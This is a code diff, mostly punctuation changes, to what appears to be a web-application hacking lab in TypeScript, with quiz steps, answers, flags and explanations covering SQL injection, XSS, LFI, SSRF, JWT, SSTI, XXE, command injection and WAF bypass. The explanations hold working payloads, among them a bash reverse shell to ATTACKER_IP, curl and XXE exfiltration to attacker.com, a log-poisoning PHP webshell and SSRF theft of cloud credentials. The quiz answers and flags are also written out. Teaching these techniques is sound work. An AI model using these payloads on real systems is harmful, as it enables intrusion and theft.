@@ -15,7 +15,7 @@ const steps: LabStep[] = [
   {
     id: 'web-01',
     title: 'Web Application Fingerprinting',
-    objective: `Before testing a web app you identify its tech stack — this tells you which vulnerabilities to prioritise. WhatWeb is a fingerprinting tool that probes HTTP headers, HTML content, and JavaScript to identify CMS, frameworks, web server, and language.
+    objective: `Before testing a web app you identify its tech stack - this tells you which vulnerabilities to prioritise. WhatWeb is a fingerprinting tool that probes HTTP headers, HTML content, and JavaScript to identify CMS, frameworks, web server, and language.
 
 What WhatWeb command performs an aggressive scan (more probes, slower, more accurate) against a target?`,
     hint: 'WhatWeb has an aggression level flag. -a 3 is aggressive mode.',
@@ -24,32 +24,32 @@ What WhatWeb command performs an aggressive scan (more probes, slower, more accu
     explanation: `whatweb -a 3 http://target.com
 
 Aggression levels:
-  1 — passive (just looks at visible headers and HTML)
-  3 — aggressive (sends extra probes, checks for specific files, slower)
-  4 — heavy aggressive (many requests, can trigger WAF/rate limits)
+  1 - passive (just looks at visible headers and HTML)
+  3 - aggressive (sends extra probes, checks for specific files, slower)
+  4 - heavy aggressive (many requests, can trigger WAF/rate limits)
 
 What WhatWeb identifies:
-  CMS       — WordPress, Joomla, Drupal, Typo3 (each has a CVE catalogue)
-  Framework — Ruby on Rails, Laravel, Django, ASP.NET
-  Web server — Apache 2.4.49, Nginx 1.18, IIS 10.0 (version = CVE matching)
-  Language   — PHP version, Python, Node.js
-  Headers    — X-Powered-By, Server, X-Frame-Options, CSP headers
+  CMS       - WordPress, Joomla, Drupal, Typo3 (each has a CVE catalogue)
+  Framework - Ruby on Rails, Laravel, Django, ASP.NET
+  Web server - Apache 2.4.49, Nginx 1.18, IIS 10.0 (version = CVE matching)
+  Language   - PHP version, Python, Node.js
+  Headers    - X-Powered-By, Server, X-Frame-Options, CSP headers
 
 Other fingerprinting approaches:
-  curl -I http://target        — HTTP headers (Server, X-Powered-By)
-  wappalyzer browser extension — visual fingerprinting in browser
-  builtwith.com                — passive fingerprinting via DNS/headers
-  nikto -h http://target       — web server misconfiguration scanner
+  curl -I http://target        - HTTP headers (Server, X-Powered-By)
+  wappalyzer browser extension - visual fingerprinting in browser
+  builtwith.com                - passive fingerprinting via DNS/headers
+  nikto -h http://target       - web server misconfiguration scanner
 
 Framework-specific findings:
-  WordPress → /wp-login.php exists, xmlrpc.php for brute-force, /wp-content/uploads/ for shells
-  Joomla    → /administrator, /configuration.php-dist for backups
-  Laravel   → .env file exposure (database creds), debug mode (stack traces with secrets)`
+  WordPress -> /wp-login.php exists, xmlrpc.php for brute-force, /wp-content/uploads/ for shells
+  Joomla    -> /administrator, /configuration.php-dist for backups
+  Laravel   -> .env file exposure (database creds), debug mode (stack traces with secrets)`
   },
 
   {
     id: 'web-02',
-    title: 'Burp Suite — Intercepting and Modifying Requests',
+    title: 'Burp Suite - Intercepting and Modifying Requests',
     objective: `Burp Suite is the industry-standard web application testing proxy. It sits between your browser and the server, letting you intercept, inspect, and modify every request and response.
 
 You are intercepting a login POST request. You want to send this request to the Repeater tool so you can modify and replay it multiple times without re-intercepting. What keyboard shortcut sends the current intercepted request to Repeater?`,
@@ -58,38 +58,38 @@ You are intercepting a login POST request. You want to send this request to the 
     xp: 15,
     explanation: `Burp Suite core workflow:
 
-  Proxy → Intercept → Modify → Forward (Ctrl+F)
+  Proxy -> Intercept -> Modify -> Forward (Ctrl+F)
 
 Key tools:
-  Proxy Intercept  — pause and modify requests in flight
-  Repeater (Ctrl+R) — replay and iterate on a single request (best for manual testing)
-  Intruder (Ctrl+I) — automated payload injection (brute-force, fuzzing, parameter testing)
-  Scanner          — automated vulnerability detection (Burp Pro only)
-  Decoder          — encode/decode base64, URL, HTML, JWT, hex
-  Comparer         — diff two responses (useful for blind SQLi, auth testing)
+  Proxy Intercept  - pause and modify requests in flight
+  Repeater (Ctrl+R) - replay and iterate on a single request (best for manual testing)
+  Intruder (Ctrl+I) - automated payload injection (brute-force, fuzzing, parameter testing)
+  Scanner          - automated vulnerability detection (Burp Pro only)
+  Decoder          - encode/decode base64, URL, HTML, JWT, hex
+  Comparer         - diff two responses (useful for blind SQLi, auth testing)
 
 Setup:
   1. Set browser proxy to 127.0.0.1:8080
-  2. Import Burp's CA certificate[](http://burpsuite/cert) → trust in browser
-  3. Navigate to target — requests appear in Proxy > HTTP History
+  2. Import Burp's CA certificate[](http://burpsuite/cert) -> trust in browser
+  3. Navigate to target - requests appear in Proxy > HTTP History
 
 Useful Repeater techniques:
-  - Modify cookie value → test session fixation, cookie manipulation
-  - Change Content-Type → trigger parser confusion (JSON vs XML)
-  - Add/remove headers → test CORS, Host header injection
-  - Inject payloads in parameters → SQLi, XSS, SSTI, SSRF testing
+  - Modify cookie value -> test session fixation, cookie manipulation
+  - Change Content-Type -> trigger parser confusion (JSON vs XML)
+  - Add/remove headers -> test CORS, Host header injection
+  - Inject payloads in parameters -> SQLi, XSS, SSTI, SSRF testing
 
 Intruder attack types:
-  Sniper     — one payload at a time per marked position
-  Battering Ram — same payload inserted into all positions simultaneously
-  Pitchfork  — parallel payload lists for each position (username list + password list)
-  Cluster Bomb — cartesian product of multiple payload lists (all combinations)`
+  Sniper     - one payload at a time per marked position
+  Battering Ram - same payload inserted into all positions simultaneously
+  Pitchfork  - parallel payload lists for each position (username list + password list)
+  Cluster Bomb - cartesian product of multiple payload lists (all combinations)`
   },
 
   // ── SECTION 2: Injection Attacks ─────────────────────────────────────────────
   {
     id: 'web-03',
-    title: 'SQL Injection — Types and Detection',
+    title: 'SQL Injection - Types and Detection',
     objective: `You are testing a web application's search endpoint: http://target.com/search?q=laptop
 
 Inserting a single quote causes a database error. You then test for time-based blind SQLi by injecting a payload that causes a 5-second delay if the database is MySQL.
@@ -119,21 +119,21 @@ What MySQL function causes a sleep delay in a SQL injection payload?`,
     ' AND LOAD_FILE('\\\\attacker.com\\file')--  (MySQL with FILE privilege)
 
 SQLMap automation:
-  sqlmap -u "http://target/search?q=1" --dbs           — enumerate databases
-  sqlmap -u "http://target/search?q=1" -D mydb --tables — enumerate tables
-  sqlmap -u "http://target/search?q=1" -D mydb -T users --dump  — dump users table
-  sqlmap -u "http://target/search?q=1" --level=5 --risk=3 --batch — aggressive detection
-  sqlmap -u "http://target/login" --data="user=a&pass=b" --dbs   — POST injection
+  sqlmap -u "http://target/search?q=1" --dbs           - enumerate databases
+  sqlmap -u "http://target/search?q=1" -D mydb --tables - enumerate tables
+  sqlmap -u "http://target/search?q=1" -D mydb -T users --dump  - dump users table
+  sqlmap -u "http://target/search?q=1" --level=5 --risk=3 --batch - aggressive detection
+  sqlmap -u "http://target/login" --data="user=a&pass=b" --dbs   - POST injection
 
 Second-order SQLi: payload stored in DB, injected when retrieved later (bypasses input sanitisation on write path if read path is vulnerable).`
   },
 
   {
     id: 'web-04',
-    title: 'Cross-Site Scripting (XSS) — Reflected, Stored, DOM',
+    title: 'Cross-Site Scripting (XSS) - Reflected, Stored, DOM',
     objective: `You find a search field that reflects input back into the page without sanitisation. You need to test whether JavaScript executes.
 
-A WAF is blocking the classic script alert payload. What is a common alternative XSS vector that doesn't use the word "script" — using an image tag with an onerror event handler?`,
+A WAF is blocking the classic script alert payload. What is a common alternative XSS vector that doesn't use the word "script" - using an image tag with an onerror event handler?`,
     hint: 'Use an img tag with a broken src and onerror=alert(1). Example: img src=x onerror=alert(1)',
     answers: [
       '<img src=x onerror=alert(1)>',
@@ -146,10 +146,10 @@ A WAF is blocking the classic script alert payload. What is a common alternative
     xp: 20,
     explanation: `XSS types and their impact:
 
-  Reflected XSS: payload in URL parameter → server reflects it → attacker sends victim the URL
+  Reflected XSS: payload in URL parameter -> server reflects it -> attacker sends victim the URL
     Impact: one-time execution in victim's browser (phishing links, BeEF hooking)
 
-  Stored XSS: payload stored in database → served to all future visitors
+  Stored XSS: payload stored in database -> served to all future visitors
     Impact: persistent execution (every visitor to a forum post gets the payload)
     Targets: comment fields, profile names, product reviews, log messages
 
@@ -181,7 +181,7 @@ Content Security Policy (CSP) defence:
 
   {
     id: 'web-05',
-    title: 'Local File Inclusion (LFI) — Reading Server Files',
+    title: 'Local File Inclusion (LFI) - Reading Server Files',
     objective: `A PHP application has a URL pattern: http://target.com/index.php?page=about
 
 You suspect the PHP code is doing something like: include($_GET['page'] . '.php');
@@ -199,29 +199,29 @@ If you can traverse out of the web root using ../ sequences, you can read arbitr
     explanation: `LFI URL: http://target.com/index.php?page=../../../../etc/passwd
 
 If the .php extension is appended automatically, the include would try to open /etc/passwd.php (which doesn't exist). Bypass techniques:
-  Null byte:   ../../../../etc/passwd%00  (terminated before .php — PHP < 5.3.4)
+  Null byte:   ../../../../etc/passwd%00  (terminated before .php - PHP < 5.3.4)
   Path length: pad with /./ to exceed max path length
   Double encoding: %252e%252e%252f (URL double-encode the ../)
 
 Useful files to read via LFI:
-  /etc/passwd           — usernames and UIDs (not passwords if shadow is used)
-  /etc/shadow           — hashed passwords (requires root-level read permission)
-  /etc/hosts            — internal hostnames / IPs
-  /proc/self/environ    — process environment variables (may contain credentials)
-  /var/log/apache2/access.log  — web access logs (log poisoning for RCE)
-  ~/.ssh/id_rsa         — SSH private key (if webserver runs as a user with one)
-  /var/www/html/config.php     — database credentials
-  /proc/self/cmdline    — current process arguments
+  /etc/passwd           - usernames and UIDs (not passwords if shadow is used)
+  /etc/shadow           - hashed passwords (requires root-level read permission)
+  /etc/hosts            - internal hostnames / IPs
+  /proc/self/environ    - process environment variables (may contain credentials)
+  /var/log/apache2/access.log  - web access logs (log poisoning for RCE)
+  ~/.ssh/id_rsa         - SSH private key (if webserver runs as a user with one)
+  /var/www/html/config.php     - database credentials
+  /proc/self/cmdline    - current process arguments
 
-Log Poisoning → LFI to RCE:
-  1. Inject PHP code in User-Agent: curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
+Log Poisoning -> LFI to RCE:
+  1. Inject PHP code in User-Agent: curl -A "<?php system($_GET['cmd']); ?>" http://target/
   2. Your UA is logged to access.log
   3. LFI the log: ?page=../../../../var/log/apache2/access.log&cmd=whoami
-  → The PHP in the log executes
+  -> The PHP in the log executes
 
 Remote File Inclusion (RFI):
   If allow_url_include is On: ?page=http://attacker.com/shell.txt
-  → Includes and executes attacker-hosted PHP file (rare in modern configs)`
+  -> Includes and executes attacker-hosted PHP file (rare in modern configs)`
   },
 
   {
@@ -229,7 +229,7 @@ Remote File Inclusion (RFI):
     title: 'Server-Side Request Forgery (SSRF)',
     objective: `You find a web application that fetches external URLs on behalf of the user: http://target.com/fetch?url=https://api.example.com/data
 
-You suspect you can make the server fetch internal resources that aren't accessible from outside. What URL would you try to access the AWS EC2 instance metadata service — a goldmine that often returns IAM credentials?`,
+You suspect you can make the server fetch internal resources that aren't accessible from outside. What URL would you try to access the AWS EC2 instance metadata service - a goldmine that often returns IAM credentials?`,
     hint: 'The AWS instance metadata service is available at a link-local IP: 169.254.169.254',
     answers: [
       'http://169.254.169.254',
@@ -239,35 +239,35 @@ You suspect you can make the server fetch internal resources that aren't accessi
     ],
     flag: 'FLAG{ssrf_cloud_pwned}',
     xp: 20,
-    explanation: `SSRF: you trick the server into making requests you specify — potentially to internal services.
+    explanation: `SSRF: you trick the server into making requests you specify - potentially to internal services.
 
 AWS metadata via SSRF:
   URL: http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-  → Returns IAM role name
+  -> Returns IAM role name
 
   Then fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
-  → Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)
+  -> Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)
 
 AWS IMDSv2 (newer, mitigates SSRF):
   Requires a PUT request to get a token first, then token in header
   Some SSRF techniques can still bypass this via redirect chains
 
 High-value SSRF targets:
-  http://169.254.169.254/        — AWS/GCP/DigitalOcean/Azure metadata
-  http://metadata.google.internal/  — GCP metadata (different endpoint)
-  http://192.168.x.x/            — internal hosts not accessible from internet
-  http://localhost:6379/           — Redis (often no authentication, arbitrary write)
-  http://localhost:9200/           — Elasticsearch (data exfiltration)
-  http://localhost:27017/          — MongoDB
-  http://localhost:2375/           — Docker API (RCE on containers)
-  file:///etc/passwd               — read local files (if file:// scheme is supported)
+  http://169.254.169.254/        - AWS/GCP/DigitalOcean/Azure metadata
+  http://metadata.google.internal/  - GCP metadata (different endpoint)
+  http://192.168.x.x/            - internal hosts not accessible from internet
+  http://localhost:6379/           - Redis (often no authentication, arbitrary write)
+  http://localhost:9200/           - Elasticsearch (data exfiltration)
+  http://localhost:27017/          - MongoDB
+  http://localhost:2375/           - Docker API (RCE on containers)
+  file:///etc/passwd               - read local files (if file:// scheme is supported)
 
 SSRF bypass techniques (when http:// is blocked):
-  http://0177.0.0.1   — octal notation for 127.0.0.1
-  http://0x7f000001   — hex notation for 127.0.0.1
-  http://127.1         — shortened localhost
-  http://[::1]         — IPv6 localhost
-  Redirect chains: host a redirect at attacker.com → 127.0.0.1 (SSRFs that follow redirects)
+  http://0177.0.0.1   - octal notation for 127.0.0.1
+  http://0x7f000001   - hex notation for 127.0.0.1
+  http://127.1         - shortened localhost
+  http://[::1]         - IPv6 localhost
+  Redirect chains: host a redirect at attacker.com -> 127.0.0.1 (SSRFs that follow redirects)
 
 Defence: allowlist of permitted URL schemes/hosts, block RFC1918 addresses, disable metadata endpoint access at cloud provider level (IMDS hop count limit).`
   },
@@ -275,7 +275,7 @@ Defence: allowlist of permitted URL schemes/hosts, block RFC1918 addresses, disa
   // ── SECTION 3: Authentication & Session Attacks ──────────────────────────────
   {
     id: 'web-07',
-    title: 'Broken Authentication — JWT Attacks',
+    title: 'Broken Authentication - JWT Attacks',
     objective: `JSON Web Tokens (JWT) are used for authentication in many modern web apps. A JWT has three base64-encoded parts: header.payload.signature
 
 You intercept a JWT with the header: {"alg":"HS256","typ":"JWT"}
@@ -290,8 +290,8 @@ A classic attack changes the algorithm to "none" to remove signature verificatio
   Decoded: {"alg":"HS256","typ":"JWT"}
 
   Attack:
-  1. Decode the header → change "alg" to "none"
-  2. Decode the payload → change "role":"user" to "role":"admin"
+  1. Decode the header -> change "alg" to "none"
+  2. Decode the payload -> change "role":"user" to "role":"admin"
   3. Remove the signature portion
   4. Re-encode and send: <new_header>.<new_payload>.
 
@@ -299,24 +299,24 @@ A classic attack changes the algorithm to "none" to remove signature verificatio
 
 Other JWT attacks:
 
-  Algorithm confusion (RS256 → HS256):
+  Algorithm confusion (RS256 -> HS256):
     If server uses RS256 (asymmetric), the public key is often publicly available.
     Attack: change alg to HS256, sign with the public key as the HMAC secret.
     Some servers use the same key for both and accept either algorithm.
 
   Weak secret brute-force (HS256):
-    jwt_tool -t TOKEN -C -d rockyou.txt    — crack the HMAC signing secret
-    hashcat -m 16500 jwt.hash rockyou.txt   — GPU-accelerated JWT cracking
+    jwt_tool -t TOKEN -C -d rockyou.txt    - crack the HMAC signing secret
+    hashcat -m 16500 jwt.hash rockyou.txt   - GPU-accelerated JWT cracking
 
   Kid injection (key injection header):
     The "kid" (key ID) header field may be used in a SQL query or file path
-    kid: ../../dev/null   → key becomes empty string → sign with empty string
-    kid: anything' UNION SELECT 'attacker_key'-- → SQL injection in key lookup
+    kid: ../../dev/null   -> key becomes empty string -> sign with empty string
+    kid: anything' UNION SELECT 'attacker_key'-- -> SQL injection in key lookup
 
 jwt_tool workflow:
-  jwt_tool TOKEN -T   — tamper mode (interactive modification)
-  jwt_tool TOKEN -X a — test algorithm attacks
-  jwt_tool TOKEN -X s — test signature stripping
+  jwt_tool TOKEN -T   - tamper mode (interactive modification)
+  jwt_tool TOKEN -X a - test algorithm attacks
+  jwt_tool TOKEN -X s - test signature stripping
 
 Defence: validate algorithm explicitly server-side, use short expiry (exp claim), store JWTs securely (httpOnly cookies, not localStorage), use refresh token rotation.`
   },
@@ -326,7 +326,7 @@ Defence: validate algorithm explicitly server-side, use short expiry (exp claim)
     title: 'Insecure Direct Object Reference (IDOR)',
     objective: `After logging in, you notice your profile URL is: http://target.com/profile?id=1042
 
-You change the id parameter to 1041 and see another user's profile. This is an IDOR (Insecure Direct Object Reference) vulnerability — one of the most common and impactful web vulnerabilities.
+You change the id parameter to 1041 and see another user's profile. This is an IDOR (Insecure Direct Object Reference) vulnerability - one of the most common and impactful web vulnerabilities.
 
 What HTTP status code would you expect from the original /profile?id=1042 endpoint when you are accessing your own profile?`,
     hint: 'A successful HTTP response returns status code 200 (OK). You are looking for what the normal response code is, before testing IDOR.',
@@ -342,20 +342,20 @@ Testing methodology:
   4. Check PUT/DELETE: can you modify or delete another user's data?
 
 IDOR examples:
-  /api/v1/orders/12345            → change to /api/v1/orders/12344 → another user's order
-  POST /api/updateEmail {"id":42} → change to {"id":43} → update another user's email
-  /download?file=report_user42.pdf → traverse to report_user41.pdf
+  /api/v1/orders/12345            -> change to /api/v1/orders/12344 -> another user's order
+  POST /api/updateEmail {"id":42} -> change to {"id":43} -> update another user's email
+  /download?file=report_user42.pdf -> traverse to report_user41.pdf
 
 Indirect IDOR:
-  /reset-password?token=abc123   → token generated from username → enumerate usernames
-  /export?format=csv&report=weekly → change report ID
+  /reset-password?token=abc123   -> token generated from username -> enumerate usernames
+  /export?format=csv&report=weekly -> change report ID
 
 Mass assignment / parameter pollution:
   POST /api/user/update with body: {"name":"attacker","role":"admin"}
   If the API doesn't filter writable fields, you can escalate your own role
 
 Testing with Burp Intruder:
-  Mark the ID value as a payload position → Numbers payload → range 1-10000 → run
+  Mark the ID value as a payload position -> Numbers payload -> range 1-10000 -> run
   Filter responses by Content-Length (a different length usually means different content = IDOR)
 
 Reporting IDOR:
@@ -381,22 +381,22 @@ What Jinja2 SSTI payload would execute the system command "id" and display the o
     explanation: `SSTI occurs when user input is embedded directly in a template string that gets rendered server-side.
 
 Jinja2 (Python/Flask/Django):
-  Detection: {{7*7}} → 49 confirms Jinja2 SSTI
+  Detection: {{7*7}} -> 49 confirms Jinja2 SSTI
 
   RCE payload:
   {{config.__class__.__init__.__globals__["os"].popen("id").read()}}
 
   Alternative (class traversal):
   {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
-  → Accesses file open class through Python's MRO (Method Resolution Order)
+  -> Accesses file open class through Python's MRO (Method Resolution Order)
 
 Template engine detection matrix:
-  {{7*7}}       → 49   = Jinja2 or Twig
-  ${7*7}        → 49   = Freemarker or Smarty
-  #{7*7}        → 49   = Ruby (ERB)
-  *{7*7}        → 49   = Spring EL (Java)
-  {{7*'7'}}     → 7777777 = Jinja2 (7 repeated 7 times)
-  {{7*'7'}}     → 49   = Twig
+  {{7*7}}       -> 49   = Jinja2 or Twig
+  ${7*7}        -> 49   = Freemarker or Smarty
+  #{7*7}        -> 49   = Ruby (ERB)
+  *{7*7}        -> 49   = Spring EL (Java)
+  {{7*'7'}}     -> 7777777 = Jinja2 (7 repeated 7 times)
+  {{7*'7'}}     -> 49   = Twig
 
 Twig (PHP) RCE:
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
@@ -405,9 +405,9 @@ Freemarker (Java) RCE:
   &#123;"freemarker.template.utility.Execute"?new()("id")&#125;
 
 Automated SSTI testing:
-  tplmap -u "http://target/search?q=test"   — auto-detects engine and exploits
+  tplmap -u "http://target/search?q=test"   - auto-detects engine and exploits
 
-  tplmap --os-shell   — interactive shell via SSTI
+  tplmap --os-shell   - interactive shell via SSTI
   tplmap --os-cmd "whoami"
 
 Defence: never concatenate user input into template strings. Use template engine sandboxing. Validate that template variables only reference safe data objects, not raw strings.`
@@ -416,7 +416,7 @@ Defence: never concatenate user input into template strings. Use template engine
   {
     id: 'web-10',
     title: 'XML External Entity (XXE) Injection',
-    objective: `A web application accepts XML in a POST request. You notice the Content-Type is application/xml. You want to test for XXE — an attack that defines an external entity in the DOCTYPE to make the XML parser fetch arbitrary files or URLs.
+    objective: `A web application accepts XML in a POST request. You notice the Content-Type is application/xml. You want to test for XXE - an attack that defines an external entity in the DOCTYPE to make the XML parser fetch arbitrary files or URLs.
 
 What DOCTYPE declaration defines an external entity "xxe" that reads /etc/passwd?`,
     hint: 'XXE DOCTYPE syntax: <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
@@ -433,7 +433,7 @@ What DOCTYPE declaration defines an external entity "xxe" that reads /etc/passwd
   <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>&xxe;</root>
 
-The XML parser expands &xxe; by reading /etc/passwd → contents appear in response.
+The XML parser expands &xxe; by reading /etc/passwd -> contents appear in response.
 
 XXE attack types:
 
@@ -442,12 +442,12 @@ XXE attack types:
 
   SSRF via XXE:
     <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-    → Reaches internal AWS metadata (same as SSRF attack, but via XML)
+    -> Reaches internal AWS metadata (same as SSRF attack, but via XML)
 
   Blind XXE (out-of-band):
     No response returned, but server makes external request
     <!ENTITY xxe SYSTEM "http://attacker.com/?data=test">
-    → Confirms XXE via DNS/HTTP interaction (use Burp Collaborator or interactsh)
+    -> Confirms XXE via DNS/HTTP interaction (use Burp Collaborator or interactsh)
 
     Blind exfiltration via parameter entity:
     <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
@@ -466,7 +466,7 @@ Defence: disable XML external entity processing in the parser (e.g., libxml_disa
 
   {
     id: 'web-11',
-    title: 'Command Injection — OS Commands in Web Apps',
+    title: 'Command Injection - OS Commands in Web Apps',
     objective: `A web application has a "ping check" feature: http://target.com/ping?host=google.com
 
 The server runs a system command like: ping -c 1 google.com using the user-supplied host value. If the input isn't sanitised, you can append additional commands.
@@ -477,24 +477,24 @@ What character allows you to chain a second command after the ping command in Li
     xp: 20,
     explanation: `Command injection chaining operators:
 
-  ;       — run second command regardless of first result
+  ;       - run second command regardless of first result
     ping -c 1 google.com; id
 
-  &&      — run second command only if first succeeds
+  &&      - run second command only if first succeeds
     ping -c 1 google.com && cat /etc/passwd
 
-  ||      — run second command only if first FAILS
+  ||      - run second command only if first FAILS
     ping -c 1 DOESNOTEXIST || id
 
-  |       — pipe output of first to second
+  |       - pipe output of first to second
     ping -c 1 google.com | id
 
-  backtick — execute and substitute: ping &#96;id&#96;
-  $()     — execute and substitute: ping $(id)
+  backtick - execute and substitute: ping &#96;id&#96;
+  $()     - execute and substitute: ping $(id)
 
 Blind command injection (no output in response):
-  Time-based: ; sleep 5 — if response takes 5 seconds, injection confirmed
-  Out-of-band: ; curl http://attacker.com/$(id) — exfiltrate via DNS or HTTP
+  Time-based: ; sleep 5 - if response takes 5 seconds, injection confirmed
+  Out-of-band: ; curl http://attacker.com/$(id) - exfiltrate via DNS or HTTP
 
 Full reverse shell via command injection:
   ; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
@@ -512,7 +512,7 @@ Filter bypass techniques:
 
   Base64: echo "aWQ=" | base64 -d | bash (executes "id")
 
-  Wildcard: /b?n/id, /bin/i? — for when literal strings are filtered
+  Wildcard: /b?n/id, /bin/i? - for when literal strings are filtered
 
 Defence: use parameterised system calls or exec arrays (never build OS command strings from user input), validate input against strict allowlist, run web services as minimal-privilege users.`
   },
@@ -523,7 +523,7 @@ Defence: use parameterised system calls or exec arrays (never build OS command s
     objective: `A Web Application Firewall (WAF) is blocking your SQL injection payloads. It blocks the word "UNION" and "SELECT".
 
 What SQL injection bypass technique uses comment syntax to break up blocked keywords?`,
-    hint: 'SQL comments /**/ can be inserted inside keywords: UN/**/ION SE/**/LECT — the DB assembles them, the WAF pattern doesn't match.',
+    hint: 'SQL comments /**/ can be inserted inside keywords: UN/**/ION SE/**/LECT - the DB assembles them, the WAF pattern doesn't match.',
     answers: [
       'UN/**/ION',
       'UNION/**/SELECT',
@@ -541,13 +541,13 @@ What SQL injection bypass technique uses comment syntax to break up blocked keyw
 
   URL encoding:
     %27 = '   %20 = space   %23 = #
-    UNION%20SELECT → UNION SELECT (simple WAF won't decode)
+    UNION%20SELECT -> UNION SELECT (simple WAF won't decode)
 
   Double URL encoding:
     %2527 = %27 after first decode = ' after second decode
 
   Case variation:
-    UnIoN SeLeCt  — case-insensitive SQL engines, case-sensitive WAF patterns
+    UnIoN SeLeCt  - case-insensitive SQL engines, case-sensitive WAF patterns
 
   HTML encoding (in reflected contexts):
     &#x27; = '   &#x55;&#x4e;&#x49;&#x4f;&#x4e; = UNION
@@ -564,12 +564,12 @@ What SQL injection bypass technique uses comment syntax to break up blocked keyw
     Some WAFs parse UTF-8 differently than the database, creating detection gaps
 
   HTTP parameter pollution:
-    ?id=1&id=2 UNION SELECT — some parsers concatenate or take last value
+    ?id=1&id=2 UNION SELECT - some parsers concatenate or take last value
 
 Tools for WAF identification and bypass:
-  wafw00f http://target.com       — identify WAF product
-  sqlmap --tamper=space2comment   — tamper scripts that transform payloads
-  sqlmap --tamper=between,space2randomblank,randomcase  — stack tampers
+  wafw00f http://target.com       - identify WAF product
+  sqlmap --tamper=space2comment   - tamper scripts that transform payloads
+  sqlmap --tamper=between,space2randomblank,randomcase  - stack tampers
 
 Note: WAF bypasses are highly WAF-specific. What works on ModSecurity may not work on CloudFlare. Always enumerate the WAF product first.`
   },
@@ -585,10 +585,10 @@ export default function WebAttacksLab() {
   const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)
 
   const sections = [
-    { num: '01-02', title: 'Recon — Fingerprinting & Burp Suite', color: accent },
-    { num: '03-06', title: 'Injection — SQLi, XSS, LFI, SSRF', color: accent },
-    { num: '07-08', title: 'Authentication — JWT & IDOR', color: accent },
-    { num: '09-11', title: 'Advanced — SSTI, XXE, CMDi', color: accent },
+    { num: '01-02', title: 'Recon - Fingerprinting & Burp Suite', color: accent },
+    { num: '03-06', title: 'Injection - SQLi, XSS, LFI, SSRF', color: accent },
+    { num: '07-08', title: 'Authentication - JWT & IDOR', color: accent },
+    { num: '09-11', title: 'Advanced - SSTI, XXE, CMDi', color: accent },
     { num: '12',    title: 'WAF Bypass Techniques', color: accent },
   ]
 
